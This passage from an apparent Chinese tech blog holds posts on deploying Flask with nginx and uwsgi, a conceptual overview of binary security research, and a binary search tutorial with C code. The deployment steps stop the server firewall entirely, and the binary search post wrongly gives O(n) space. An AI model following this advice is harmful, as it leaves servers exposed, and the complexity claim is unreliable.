<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl stop nginx</span><br><span class="line">kill uwsgi的所有进程</span><br><span class="line">systemctl stop iptables</span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line"># vi app.py</span><br><span class="line">app.run(host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;5000)</span><br><span class="line"></span><br><span class="line"># app.run一定要设成 0.0.0.0 才可以访问</span><br><span class="line"></span><br><span class="line"># 以http:&#x2F;&#x2F;121.199.46.37:5000&#x2F; 访问 ip+端口号</span><br></pre></td></tr></table></figure>
<h3 id="Method-2-uwsgi-访问无需端口号，直接以阿里云服务器公网访问"><a href="#Method-2-uwsgi-访问无需端口号，直接以阿里云服务器公网访问" class="headerlink" title="Method 2 - uwsgi - 访问无需端口号，直接以阿里云服务器公网访问"></a>Method 2 - uwsgi - 访问无需端口号，直接以阿里云服务器公网访问</h3><ul>
<li>pip install uwsgi</li>
<li><a href="https://uwsgi-docs.readthedocs.io/en/latest/WSGIquickstart.html">uwsgi官方文档</a></li>
<li><code>run.py</code>文件修改成<code>app.run()</code></li>
<li>在项目中新建文件config.ini，<code>uwsgi</code>的配置<code>/Sfim/src/config.ini</code>，编写如下配置配置如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"></span><br><span class="line"># uwsgi 启动时所使用的地址与端口</span><br><span class="line">socket &#x3D; 127.0.0.1:5000</span><br><span class="line"></span><br><span class="line"># 外网访问端口，如果直接用uWSGI外网，这里由于使用了Nginx，故注释掉</span><br><span class="line">http&#x3D; :80</span><br><span class="line"></span><br><span class="line"># 指向网站目录</span><br><span class="line">chdir &#x3D; &#x2F;root&#x2F;test&#x2F;</span><br><span class="line"></span><br><span class="line"># python 启动程序文件</span><br><span class="line">wsgi-file &#x3D; app.py</span><br><span class="line"></span><br><span class="line"># python 程序内用以启动的 application 变量名</span><br><span class="line"># app 是 app.py 程序文件内的一个变量，这个变量的类型是 Flask的 application 类</span><br><span class="line">callable &#x3D; app</span><br><span class="line"></span><br><span class="line"># 处理器数</span><br><span class="line">processes &#x3D; 4</span><br><span class="line"></span><br><span class="line"># 线程数</span><br><span class="line">threads &#x3D; 2</span><br><span class="line"></span><br><span class="line">#状态检测地址</span><br><span class="line">stats &#x3D; 127.0.0.1:9191</span><br><span class="line"></span><br><span class="line">#daemonize&#x3D;&#x2F;var&#x2F;log&#x2F;uwsgi.log</span><br></pre></td></tr></table></figure>
<ul>
<li><p>启动：uwsgi –ini config.ini</p>
</li>
<li><p>使用uwsgi之后，修改app.py -&gt; app.run()</p>
</li>
<li><p>一定要保证代码风格是严格按照官网的</p>
<ul>
<li>即app=Flask(<strong>name</strong>)要放在<code>if __name__ = &quot;__main__&quot;</code>外面</li>
<li><code>if __name__ = &quot;__main__&quot;</code>里面只能放<code>app.run()</code></li>
<li>不然会报错<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Exception: Install &#39;email_validator&#39; for email validation support.</span><br><span class="line">unable to load app 0 (mountpoint&#x3D;&#39;&#39;) (callable not found or import error)</span><br><span class="line">--- no python application found, check your startup logs for errors ---</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://segmentfault.com/q/1010000014488435">解决方法1</a></li>
<li><a href="https://segmentfault.com/q/1010000014488435">解决方法2</a></li>
</ul>
</li>
</ul>
</li>
<li><p>uwsgi运行相关应用时要加上-d参数使其在后台运行，否则断开ssh连接后uwsgi就停止运行了，-d后要加上项目的uwsgi.log文件，没有新建一个即可。例 -d ~/uwsgi.log</p>
</li>
</ul>
<h3 id="Method-3-nginx-访问无需端口号，直接以阿里云服务器公网访问"><a href="#Method-3-nginx-访问无需端口号，直接以阿里云服务器公网访问" class="headerlink" title="Method 3 -nginx - 访问无需端口号，直接以阿里云服务器公网访问"></a>Method 3 -nginx - 访问无需端口号，直接以阿里云服务器公网访问</h3><ul>
<li>先关闭uwsgi</li>
<li>/etc/nginx/nginx.conf / 日志/var/log/nginx/error.log  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#只用nginx代理的配置</span><br><span class="line">server &#123;</span><br><span class="line">     listen          80;</span><br><span class="line">     server_name     47.106.218.225;  # 阿里云公网ip</span><br><span class="line"> </span><br><span class="line">     location &#x2F; &#123;</span><br><span class="line">        proxy_pass    http:&#x2F;&#x2F;127.0.0.1:5000;      # 本机:启动端口（此处端口与项目端口一致）      </span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python app.py</span><br><span class="line">nohup python app.py &gt;&gt; app.out &amp;   将运行日志输出到app.out文件</span><br><span class="line">nohup python run.py &gt;&gt; run.out &amp; </span><br><span class="line"># nohup 加在一个命令的最前面，表示不挂断的运行命令</span><br><span class="line"># &amp; 加在一个命令的最后面，表示这个命令放在后台执行</span><br><span class="line"># ps 和 jobs</span><br><span class="line"># 区别在于 jobs 只能查看当前终端后台执行的任务，换了终端就看不见了</span><br><span class="line"># ps命令适用于查看瞬时进程的动态，可以看到别的终端的任务</span><br><span class="line"># a: 显示所有程序  u: 以用户为主的格式来显示   x: 显示所有程序，不以终端机来区分</span><br><span class="line"># fg命令 将后台中的命令调至前台继续运行</span><br><span class="line"># Ctrl + z 命令 将一个正在前台执行的命令放到后台，并且处于暂停状态</span><br><span class="line"># bg命令 将一个在后台暂停的命令，变成在后台继续执行</span><br><span class="line">tail -f app.out</span><br><span class="line">tailf app.out</span><br></pre></td></tr></table></figure>
<h3 id="Method-4-nginx-uwsgi-访问无需端口号，直接以阿里云服务器公网访问"><a href="#Method-4-nginx-uwsgi-访问无需端口号，直接以阿里云服务器公网访问" class="headerlink" title="Method 4 - nginx + uwsgi - 访问无需端口号，直接以阿里云服务器公网访问"></a>Method 4 - nginx + uwsgi - 访问无需端口号，直接以阿里云服务器公网访问</h3></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; config.ini</span><br><span class="line">#http &#x3D; :80</span><br><span class="line"></span><br><span class="line">&gt; &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">server &#123;</span><br><span class="line">        #ssl_protocols TLSv1.2;</span><br><span class="line">        #server_tokens off;</span><br><span class="line">        listen       80 default_server;</span><br><span class="line">        #listen       [::]:80 default_server;</span><br><span class="line">        server_name  121.199.46.37; # 阿里云公网ip</span><br><span class="line">        #root         &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line"></span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">           #proxy_pass http:&#x2F;&#x2F;127.0.0.1:5000; # 本机:启动端口(此处端口与项目端口一致)</span><br><span class="line">           #proxy_set_header Host $host;</span><br><span class="line">           #proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">           include uwsgi_params;</span><br><span class="line">           uwsgi_pass 127.0.0.1:5000;</span><br><span class="line">           uwsgi_param UWSGI_PYHOME &#x2F;usr&#x2F;bin&#x2F;python; # python位置</span><br><span class="line">           uwsgi_param UWSGI_CHDIR &#x2F;root&#x2F;test; # 项目根目录</span><br><span class="line">           uwsgi_param UWSGI_SCRIPT app:app;</span><br><span class="line">        &#125;</span><br><span class="line"># 跑起来</span><br><span class="line">systemctl start nginx</span><br><span class="line"></span><br><span class="line">nginx -s reload</span><br><span class="line">service nginx restart  # 重启nginx服务</span><br><span class="line">service nginx start # 启动服务</span><br><span class="line">service nginx stop # 停止服务 </span><br><span class="line"></span><br><span class="line">运行uwsgi服务（通过执行启动脚本运行项目）</span><br><span class="line">uwsgi --ini config.ini  （启动脚本存放位置）</span><br><span class="line"># 后台运行</span><br><span class="line">uwsgi --ini config.ini --daemonize uwsgi.out</span><br></pre></td></tr></table></figure>
<ul>
<li>错误提示  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[error] 2168#0: *19 connect() failed (111: Connection refused) while connecting to upstream</span><br></pre></td></tr></table></figure>
  <a href="https://segmentfault.com/q/1010000014488435">参考资料</a>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; config.ini</span><br><span class="line">[uwsgi]</span><br><span class="line">socket&#x3D;127.0.0.1:8080</span><br><span class="line">plugins &#x3D; python</span><br><span class="line">wsgi-file&#x3D;test.py</span><br><span class="line">master&#x3D;true</span><br><span class="line">processes&#x3D;4</span><br><span class="line">threads&#x3D;2</span><br><span class="line">callable&#x3D;app</span><br><span class="line">stats&#x3D;127.0.0.1:9191</span><br><span class="line"></span><br><span class="line">&gt; nginx.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name 111.230.140.182;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    client_max_body_size 75M;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:8080;</span><br><span class="line">        #uwsgi_param UWSGI_PYTHON &#x2F;usr&#x2F;bin&#x2F;python;  &#x2F;&#x2F;注释掉</span><br><span class="line">        #uwsgi_param UWSGI_CHDIR &#x2F;home&#x2F;ubuntu&#x2F;project&#x2F;test;  &#x2F;&#x2F;注释掉</span><br><span class="line">        #uwsgi_param UWSGI_SCRIPT test:app ;  &#x2F;&#x2F;注释掉</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>注意点：<ul>
<li>不同的web application要更换不同的端口，否则会出错，即使停掉了所有服务只启动一个服务也是如此</li>
</ul>
</li>
</ul>
<h2 id="nginx-uwsgi-flask的参考资料"><a href="#nginx-uwsgi-flask的参考资料" class="headerlink" title="nginx+uwsgi+flask的参考资料"></a>nginx+uwsgi+flask的参考资料</h2><table>
<thead>
<tr>
<th>Name</th>
<th>Explanation</th>
</tr>
</thead>
<tbody><tr>
<td>Flask</td>
<td>一个轻量级的Python Web框架</td>
</tr>
<tr>
<td>Nginx</td>
<td>一个非常稳定的Web服务器</td>
</tr>
<tr>
<td>uwsgi</td>
<td>一个全站式的托管服务，它实现了应用服务器（支持多种编程语言）、代理、进程管理器、监视器</td>
</tr>
</tbody></table>
<ul>
<li><p>使用Nginx服务器托管Flask应用的安装、配置过程</p>
</li>
<li><p>Nginx是一个提供静态文件访问的web服务，然而，它不能直接执行托管Python应用程序，而uWSGI解决了这个问题？？？</p>
</li>
<li><p><a href="https://www.missshi.cn/api/view/blog/5b1511a213d85b1251000000">可以看看理论部分-使用Flask+uwsgi+Nginx部署Flask正式环境</a></p>
<blockquote>
<p>直接使用python run.py运行服务的方式只适合本地开发<br>线上运行时要保证更高的性能和稳定性，需要使用uwsgi进行部署</p>
</blockquote>
<blockquote>
<p>使用Nginx有如下一些优点：<br>安全：不管什么请求都要经过代理服务器，避免了外部程序直接攻击web服务器<br>负载均衡：根据请求情况和服务器负载情况，将请求分配给不同的web服务器，保证服务器性能<br>提高web服务器的IO性能：对于一些静态文件，可以直接由反向代理处理，不经过web服务器</p>
</blockquote>
</li>
<li><p><a href="https://www.jianshu.com/p/5b73444eb47d">只看了概念解释-新手的Flask+uwsgi+Nginx+Ubuntu部署过程</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/48048554f989">一篇就弄懂WSGI、uwsgi和uWSGI的区别</a></p>
</li>
</ul>
<h1 id="备用资料"><a href="#备用资料" class="headerlink" title="备用资料"></a>备用资料</h1><ul>
<li><a href="https://yq.aliyun.com/articles/637307">最新阿里云申请免费SSL证书实现网站HTTPS化（图文教程一）</a></li>
</ul>
<blockquote>
<p>通过在阿里云服务器ECS(系统为centos7)上搭建Web服务器，能够实现不仅仅是在本地，而是在互联网的访问我们的网站。使用uWSGI和Nginx部署flask项目，<br>其中uWSGI一个全站式的托管服务，它实现了应用服务器(支持多种编程语言)、代理、进程管理器、监视器，帮助实现WSGI协议、Http协议等，使得开发者不再需要关注网络通信的底层实现，而花更多的时间开发上层应用。<br>WSGI(Web Server Gateway Interface)服务器网关接口是Python应用程序或框架和Web服务器之间的一种接口，已经被广泛接受。只要遵照这些协议，WSGI应用(Application)都可以在任何服务器(Server)上运行。通过利用uWSGI可以使我们的web应用得到更强的并发能力。<br>通过Nginx，一个非常稳定的Web服务器和反向代理服务器，能够进一步提高并发能力和访问效率。Nginx还有如下优点：安全，不管什么请求都要经过代理服务器，避免了外部程序直接攻击web服务器；负载均衡，根据请求情况和服务器负载情况，将请求分配给不同的web服务器，保证服务器性能；提高web服务器的IO性能，对于一些静态文件，可以直接由反向代理处理和缓存，不经过web服务器。<br>用户和本项目搭建的应用程序中的交互流程为：Nginx接受来自客户端的Http请求发送给uWSGI，uWSGI处理请求并将关键信息传递给web框架flask或者web应用等，应用返回Response经由uWSGI发送给Nginx，Nginx再发送给客户端。</p>
</blockquote>
<p>解决问题的实际感受：了解阿里云云服务器ECS，发现一台暴露在网络的服务器经常受到威胁和攻击，从买了他们的产品开始，每天都会有警告邮件，要按照阿里云官方的解决方法修补漏洞和加固，深入了解了Web服务器的部署，学习到了Nginx和uWSGI的知识</p>
<details>
<summary>代码细节</summary>

<h2 id="sqlalchemy的用法"><a href="#sqlalchemy的用法" class="headerlink" title="sqlalchemy的用法"></a>sqlalchemy的用法</h2><h2 id="flask蓝图"><a href="#flask蓝图" class="headerlink" title="flask蓝图"></a>flask蓝图</h2><h2 id="编写index-html界面"><a href="#编写index-html界面" class="headerlink" title="编写index.html界面"></a>编写index.html界面</h2><ul>
<li>index.html出现的位置home.py</li>
</ul>
<h2 id="Windows跑代码"><a href="#Windows跑代码" class="headerlink" title="Windows跑代码"></a>Windows跑代码</h2><ul>
<li>验证邮箱的时候，服务没有开启 <a href="http://www.sfim.tools/">www.sfim.tools</a> 改为 192.168.0.101:8080</li>
<li>models里面是和数据库有关的</li>
</ul>
<h2 id="windows-安装-mysql-8-0-19"><a href="#windows-安装-mysql-8-0-19" class="headerlink" title="windows 安装 mysql 8.0.19"></a>windows 安装 mysql 8.0.19</h2><ul>
<li><a href="https://www.jb51.net/article/179326.htm">安装教程</a></li>
<li><a href="https://www.cnblogs.com/MrKeen/p/12575325.html">mysql front 报错</a></li>
</ul>
</details>]]></content>
      <tags>
        <tag>nginx</tag>
        <tag>uwsgi</tag>
        <tag>web server</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全中的二进制安全</title>
    <url>/2020/06/13/binary-safe/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>二进制安全是整个软件安全中核心的内容</p>
<a id="more"></a>

<h2 id="二进制软件"><a href="#二进制软件" class="headerlink" title="二进制软件"></a>二进制软件</h2><ul>
<li>核心：二进制是软件的最基本形态<ul>
<li>所有的基础软件都是以二进制软件的形式存在</li>
<li>二进制软件：操作系统、浏览器、数据库、中间件、各种脚本软件的解释执行器、很多大型游戏</li>
</ul>
</li>
<li>二进制软件的基本特征：是CPU可以直接运行的机器指令<ul>
<li>CPU能够运行的机器指令都是二进制的，包括了很多非ASCII的不可打印字符</li>
<li>二进制程序无法跨平台：不同平台的二进制软件是不同的，Intel架构的cpu的二进制无法在ARM架构上运行，反之也是</li>
<li>二进制形式的软件无法跨操作系统运行：二进制程序还需要操作系统的支持</li>
</ul>
</li>
<li>直接使用二进制或者十六进制进行编程，人进行数据阅读比较困难，效率非常低下 -&gt; 编程的时候不直接处理二进制，直接使用文本来编程<ul>
<li>文本代码CPU无法执行，需要<strong>编译和链接</strong></li>
<li>程序员编写出来的文本形式的代码 -&gt; 源代码<ul>
<li>首先发明的源代码是汇编形式的，是使用的和机器指令一一对应的汇编语言，是一种直接最简单的操作指令级别的翻译过程</li>
<li>汇编的编程还不是很方便，后来发明了C语言等高级语言，高级语言不止C语言一种，但是C比较成功，又发明了C++</li>
</ul>
</li>
<li>编译后生成的机器可运行的代码 -&gt; 目标代码</li>
</ul>
</li>
<li>研究二进制安全，首先需要了解的就是二进制软件和源代码，之后是脚本语言的关系</li>
</ul>
<h2 id="软件安全研究的核心问题"><a href="#软件安全研究的核心问题" class="headerlink" title="软件安全研究的核心问题"></a>软件安全研究的核心问题</h2><ul>
<li>看表面不够，深入内部细节，需要了解的软件的具体原理，到代码级别</li>
<li>已经发现的软件安全典型的问题：栈溢出、堆溢出、格式化字符串漏洞、空指针、整形溢出等等</li>
<li>软件安全研究的两个核心问题<ul>
<li>安全问题（也叫脆弱性，通常叫漏洞）的存在性问题 - 漏洞挖掘</li>
<li>这个安全问题的可利用性问题，安全漏洞具体有什么危害，如果达到这个危害如何防止 - 漏洞利用</li>
</ul>
</li>
</ul>
<h3 id="漏洞挖掘-安全问题的存在性问题"><a href="#漏洞挖掘-安全问题的存在性问题" class="headerlink" title="漏洞挖掘 - 安全问题的存在性问题"></a>漏洞挖掘 - 安全问题的存在性问题</h3><ul>
<li>安全问题的脆弱性，通常叫漏洞</li>
<li>由于软件安全的漏洞都是具体的，都是由软件内部的代码的编程不慎所引起的 &gt; 所以漏洞挖掘方法就是分析代码</li>
<li>分析二进制（安全人员捕获一个攻击程序后拿不到源代码，源代码在发起攻击的人 / 黑客手上）<ul>
<li>在了解二进制机器指令的基本原理后，通过一些辅助的工具来解读</li>
<li>通过逆向工程的一些技术，把二进制软件解构、翻译，然后就能理解其实现的原理</li>
</ul>
</li>
<li>漏洞挖掘技术现在是攻防双方都在使用：软件的开发人员也在采用黑客发明的漏洞挖掘技术来挖自己的漏洞，以争取在软件发布前把安全问题尽量发现和修补</li>
</ul>
<h4 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h4><ul>
<li>反汇编以及在汇编代码上的一些解构，比如获得函数列表、获得每个函数的调用关系、获得函数内部的控制流程图</li>
<li>变量名、函数名、注释、一些数据类型是源代码层面方便程序员编程的，对于二进制软件来讲，名称信息没有用处，机器指令内部全部是使用“数据和代码的存储地址”</li>
<li>反汇编工具：基本 &gt; dumpbin &amp; objdump，高级 &gt; IDA-pro</li>
<li>所有的调试器也都有反汇编功能</li>
</ul>
<h4 id="调试器"><a href="#调试器" class="headerlink" title="调试器"></a>调试器</h4><ul>
<li>调试器比反汇编器要高级，因为反汇编器只能在程序没有运行起来的时候去观察它，而调试器可以在程序运行起来以后，随时中断程序的运行并观察</li>
<li>运行时的信息要更丰富，比如运行时候可以看到用户输入的数据、外部读入的数据、这些数据的具体处理过程、某个变量在运行时的赋值情况等，这些信息都是静态的反汇编所没有的。但信息丰富则需要分析和处理的数据量是非常大的</li>
<li>调试器还有一个反汇编器没有的功能：能捕获<strong>程序执行的异常</strong><ul>
<li>异常信息：因为二进制软件的安全问题，通常会引起程序运行时的内部数据结构被破坏，比如各种溢出，其实是覆盖了正常的数据。内部数据结构被破坏以后，程序在后续执行时，可能访问这些不正常的数据，进而引起运行时错误</li>
<li>大多数运行时错误，最后都变成内存访问的异常 &gt; 虚拟内存管理方面的知识</li>
</ul>
</li>
</ul>
<h4 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h4><p>有了调试器和反汇编器，就有了观察和了解程序内部原理的工具，这些基础工具就像医院用的心电图、X光和CT一样，是获得内部基础数据的工具。但是只有这些工具，有时候还是不能发现具体问题，我们得了解具体漏洞产生的原因，比如溢出，为什么溢出是严重的安全问题</p>
<p>寻找漏洞最直接的思路，是一行行看代码 &gt; 可行性 &amp;&amp; 巨大的麻烦(软件是一个非常复杂和庞大的事物，比如Windows，有上万名开发人员，持续开发了20年，发布了无数个版本。如果一行行看代码，还不是源代码，是二进制反汇编代码，则需要和开发人员同等数量的人员和时间，这往往是达不到的)</p>
<p><strong>所以漏洞的挖掘，极少情况下会直接人工分析源代码，安全研究人员们，更希望借助自动化的工具</strong></p>
<h4 id="两大类自动化工具：模糊测试工具-amp-程序分析工具"><a href="#两大类自动化工具：模糊测试工具-amp-程序分析工具" class="headerlink" title="两大类自动化工具：模糊测试工具 &amp; 程序分析工具"></a>两大类自动化工具：模糊测试工具 &amp; 程序分析工具</h4><h5 id="模糊测试-Fuzzing"><a href="#模糊测试-Fuzzing" class="headerlink" title="模糊测试(Fuzzing)"></a>模糊测试(Fuzzing)</h5><ul>
<li>认为软件很复杂，干脆不要去看内部了，把软件当做一个黑盒子，只看它的外部表现，给它各种各样的输入，看它在处理过程中会不会出现异常。如果有异常就说明软件在设计的过程中，没有考虑到用户会输入这样的数据，和软件的预期不符合，则存在漏洞。程序异常通常会引起程序的崩溃，用调试器来捕获异常，能实现自动化</li>
<li>通过研究漏洞的原理，漏洞是<strong>畸形数据</strong>引起的，比如输入了一个超长的字符串，比程序员内部预留的长，则发生溢出。所以通过输入畸形数据去尝试触发崩溃的方法，理论上也是可行的<ul>
<li>通过<strong>随机</strong>，构造畸形数据。随机并不是每次都能构造出正好合适的畸形数据，但是随即构造大量数据以后很有可能有那么一两次成功</li>
<li>软件虽然复杂，但是运行速度很快，可以<strong>不停的自动</strong>运行目标软件，让软件来处理这些随机构造的可能是畸形的数据，然后运行的时候启动调试器来捕获可能得异常，虽然不是每次都能触发异常</li>
</ul>
</li>
</ul>
<h5 id="模糊测试工具"><a href="#模糊测试工具" class="headerlink" title="模糊测试工具"></a>模糊测试工具</h5><ul>
<li>深入软件的内部原理的，分析它的每一行代码</li>
<li>代表的技术：危险函数定位和符号执行等<ul>
<li>危险函数定位的思路是，既然strcpy等能引起缓冲区溢出，那么就把全部的strcpy找出来看一看。随着研究的深入，人们发现，不是所有的漏洞都是危险函数引起的。内存操作的方法各种各样，千奇百怪，而且不是所有的危险函数都会引起安全问题。比如调用之前进行了长度判断 &gt; 所以这种方法效果很差</li>
<li>符号执行：分析方法，逐步复杂</li>
</ul>
</li>
</ul>
<h3 id="漏洞利用-安全问题的可利用性问题"><a href="#漏洞利用-安全问题的可利用性问题" class="headerlink" title="漏洞利用 - 安全问题的可利用性问题"></a>漏洞利用 - 安全问题的可利用性问题</h3><ul>
<li>安全漏洞具体有什么危害 / 安全缺陷的危害，如果达到这个危害，如何防止</li>
<li>编写exp（漏洞利用程序）也是软件安全研究人员的基本功<ul>
<li>exp一般分为攻击数据部分 + 攻击成功后的控制部分，前一部分比如一个超级长的字符串，用来溢出缓冲区；后一部分，就是shellcode</li>
<li>shellcode很多时候可以通用，但是攻击数据部分，每个漏洞都不一样。这部分的学习，比较有效的办法就是去阅读和使用别人写好的exp。kali Metasploit exploit-db上有很多这样的程序，有一些安全研究人员的个人博客上也有很多。所以大家就去找一两个公开了exp的具体的漏洞，搭建漏洞环境，解读学习exp &gt; <strong>漏洞复现</strong></li>
</ul>
</li>
</ul>
<h4 id="别人已经挖掘发现的漏洞"><a href="#别人已经挖掘发现的漏洞" class="headerlink" title="别人已经挖掘发现的漏洞"></a>别人已经挖掘发现的漏洞</h4><ul>
<li>一些软件厂家，比如微软会定期升级自己的系统，打补丁。在打补丁升级系统的时候，就会同时给出安全公告说修补了那些问题</li>
<li>统一的数据库CVE：但是并不是每个软件厂家都有能力或者意愿去维护一个安全漏洞。有一些第三方的组织就来收集各种漏洞，并形成了一个统一的数据库，比如CVE<ul>
<li>CVE给每个漏洞都编写，说明漏洞影响的软件及其版本，危害程度等等详细信息</li>
<li>少量的漏洞还会给出PoC，也就是概念验证程序。早期的漏洞很多都有PoC，因为那个时候，很多软件厂家不重视漏洞修补工作。漏洞的发现人员，或者安全厂商放出PoC也能逼迫软件厂商去修补</li>
<li>现在，软件漏洞的披露已经很规范了。国家也重视，所有美国和我们有国家安全漏洞数据库，美国有NVD，我们国家的CNVD和CNNVD。这些都是大家去找已经公开的漏洞的地方</li>
</ul>
</li>
</ul>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>如果拿到了一个漏洞的详细公告和PoC，如何去复现这个漏洞：安装一个有漏洞存在的软件版本</p>
<p>虚拟机：这个过程中，通常在<strong>虚拟机</strong>里安装配置。因为漏洞需要的环境可能和我们的工作主机的环境冲突很大，而且漏洞环境复现过程中，可能会破坏系统。如果我们要复现很多漏洞，不在虚拟机中进行，会把自己的工作环境弄得很乱</p>
<p>模拟器：模拟器和虚拟机相似又不同，他们都是在内部构造了一个“虚拟的机器”。这个虚拟的机器可以和真实的机器一样安装和运行操作系统以及各种软件。但是虚拟机，还是借助的物理CPU的虚拟化功能，而模拟器是使用软件来“实现”了一个CPU及其附属的设备</p>
<ul>
<li>虚拟机的host系统和guest系统，只能是同一架构的。比如物理主机是intel架构，那么host和guest都这能是Intel 0x86架构的系统，比如Windows和Linux x86。但是模拟器就可以跨架构，host是Windows x86，guest是arm架构的安卓系统。</li>
<li>模拟器的典型代表：<a href="https://www.qemu.org/">QEMU</a></li>
<li>如果要研究安卓系统、路由器等MIPS架构的系统，就需要模拟器</li>
<li>模拟器通常也有调试、单步运行等功能，除了用于漏洞复现，也可用于漏洞挖掘。比如要挖掘一个路由器的漏洞，不能直接对着物理路由器Fuzzing，因为就是触发了异常，也无法捕获。所以通常是把固件提取出来，在模拟器中运行</li>
</ul>
<h4 id="软件攻防"><a href="#软件攻防" class="headerlink" title="软件攻防"></a>软件攻防</h4><p>黑客如果通过攻击，进入到了一个目标系统。除了要考虑窃取信息、加密硬盘（勒索软件）、破坏数据等攻击之外，还需要考虑：第一是不留痕迹，第二是不能被杀毒软件和主机中的一些防御系统识别</p>
<p>早期，安全研究人员也在想办法对抗漏洞攻击和计算机病毒（计算机病毒其实就是一个可以自我复制的漏洞利用程序）。他们想到的办法就是杀毒软件</p>
<ul>
<li>杀毒软件的基本原理是把已经发现的病毒等各种恶意程序的特征值记录在数据库中，每当系统中有新的文件时就计算一下这个文件的特征值，然后和数据库中的特征值进行比较，如果匹配上了，说明这是一个恶意程序</li>
<li>特征值通常是hash值。因为恶意软件很多，不可能把整个恶意软件都作为特性，占用空间也不方便分发特征值（分发特征值就是病毒升级）。但是如果源数据稍微变化一下，hash值就变化了。比如病毒修改自己的一个无意义的常量数据，功能不变，杀毒软件就无法查杀了。所以后来有发明了动态的基于行为的检测。</li>
<li>rootkit技术：恶意软件需要隐蔽自己，比如文件、进程、通讯的端口都需要隐藏起来<ul>
<li>rootkit技术很多是基于API hook。通过挂钩API，篡改了操作系统的行为，当防御软件在列举目录中文件时，根本就获取不到攻击程序的文件</li>
</ul>
</li>
</ul>
<p>防御软件和攻击软件就是一个技术博弈，此消彼长的过程，产生了非常多很有意思的技术：</p>
<ul>
<li>比如攻击软件为了防止被发现，根本就不产生文件。可执行程序首先是一个文件，在系统上创建进程运行。后来出现了根本不产生文件，也不修改其他文件，寄生在其他可执行程序进程中、直接从网络加载到内存就能运行的恶意程序</li>
<li>外挂：外挂程序也是通过修改正常程序的软件行为，比如直接篡改内存中的数据，或者挂钩其函数，达到修改软件行为的目的。开发和防御外挂软件的技术与软件攻防技术相似，都是需要使用逆向工程工具和调试器等、都需要大量的数据分析工作</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>二分查找【binary search】</title>
    <url>/2021/03/13/binary-search/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>时间复杂度：$O(log_{2}N)$ （每次缩小一半）<br>空间复杂度：$O(n)$</p>
<p>使用二分查找的前提：单调性</p>
<ul>
<li>若不具有单调性，可以通过定义新的数据表示，实现单调性</li>
</ul>
<h1 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h1><ul>
<li>假设待查找的数为 $x$，$l$ 是头指针，$r$ 是尾指针，则设 $mid = (l + r) / 2$</li>
<li>循环终止条件为 $l &gt; r$ （待查找区间无）<ul>
<li>$arr[mid] &lt; x, l = mid + 1$</li>
<li>$arr[mid] &gt; x, r = mid - 1$</li>
<li>$arr[mid] == x, success$</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arr:待查找区间 n:区间长度 x:待查找元素</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> *arr, <span class="keyword">int</span> n, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> head = <span class="number">0</span>, tail = n - <span class="number">1</span>, mid;</span><br><span class="line">    <span class="keyword">while</span> (head &lt;= tail) &#123;</span><br><span class="line">        mid = (head + tail) / <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// mid = (head + tail) &gt;&gt; 1;</span></span><br><span class="line">        <span class="keyword">if</span> (arr[mid] == x) <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &lt; x) head = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> tail = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>递归写法</strong>（任何一个有唯一解的问题都可以用递归实现）</p>
